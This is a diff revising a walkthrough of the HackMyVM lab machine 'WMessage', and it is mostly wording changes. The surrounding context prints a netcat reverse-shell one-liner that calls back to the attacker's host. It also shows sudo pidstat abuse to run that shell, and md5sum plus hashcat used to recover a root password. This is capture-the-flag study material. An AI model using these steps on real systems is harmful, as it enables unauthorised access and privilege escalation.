@@ -3,7 +3,6 @@
 | -------- | ---------- | ----- | ------------- | ---------------------------------------------------- |
 | WMessage | Easy       | Linux | 192.168.0.121 | https://hackmyvm.eu/machines/machine.php?vm=WMessage |
 
-# Not complete!
 ### ARP Scan
 
 ```bash
@@ -118,6 +117,8 @@ www-data@MSG:/$
 
 ### Privilege Escalation - Messagemaster
 
+We can see two users in the `/home` directory:
+
 ```bash
 www-data@MSG:/$ ls -lash /home
 ls -lash /home
@@ -157,7 +158,6 @@ Payload size: 98 bytes
 mkfifo /tmp/wmbogd; nc 192.168.0.51 4444 0</tmp/wmbogd | /bin/sh >/tmp/wmbogd 2>&1; rm /tmp/wmbogd
 ```
 
-
 I created a simple script in the `/tmp` directory:
 
 ```bash
@@ -172,7 +172,7 @@ And made it executable:
 www-data@MSG:/tmp$ chmod +x ./shell.sh
 ```
 
-Now, I will execute `pidstat` as the `messagemaster` user and point the `-e` flag to my script:
+I will execute `pidstat` as the `messagemaster` user and point the `-e` flag to my script:
 
 ```bash
 www-data@MSG:/tmp$ sudo -u messagemaster /bin/pidstat -e ./shell.sh
@@ -306,10 +306,6 @@ I can now `ssh` into the box as the `messagemaster` user:
 ```bash
 garffff@garffff:~/hackmyvm/wmessage$ vi id_rsa
 garffff@garffff:~/hackmyvm/wmessage$ chmod 600 id_rsa 
-garffff@garffff:~/hackmyvm/wmessage$ 
-garffff@garffff:~/hackmyvm/wmessage$ ssh -i id_rsa messagemaster@192.168.0.211
-messagemaster@192.168.0.211's password: 
-
 garffff@garffff:~/hackmyvm/wmessage$ ssh -i id_rsa messagemaster@192.168.0.211
 Linux MSG 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
 
@@ -327,6 +323,8 @@ messagemaster@MSG:~$
 ```
 
 ### Privilege Escalation - Root:
+
+Issuing the `sudo -l` command again, we see that we can use the `/bin/md5su` as root:
 
 ```bash
 messagemaster@MSG:/var/www$ sudo -l
@@ -349,7 +347,7 @@ total 16K
 4.0K -rw-r-----  1 root     root       12 Nov 21  2022 ROOTPASS
 ```
 
-Using the `/bin/md5sum` with sudo we get the MD5 hash of the file:
+Using the `/bin/md5sum` with `sudo` we get the MD5 hash of the file:
 
 ```bash
 messagemaster@MSG:/var/www$ sudo /bin/md5sum /var/www/ROOTPASS
@@ -438,7 +436,7 @@ Hardware.Mon.#1..: Temp: 62c Fan: 28% Util: 34% Core:1923MHz Mem:5005MHz Bus:16
 
 So there is an issue here. Hashcat does not recognise what the hash is.  This is because of the new line character used `\n`. 
 
-Looking at the `od -c` command output we see the new line character`\n`:
+Looking at the `od -c` on command on `rockyou.txt`, we see in the output new line character`\n`:
 
 ```bash
 garffff@garffff:~/python/hashlib$ od -c /opt/rockyou.txt | more
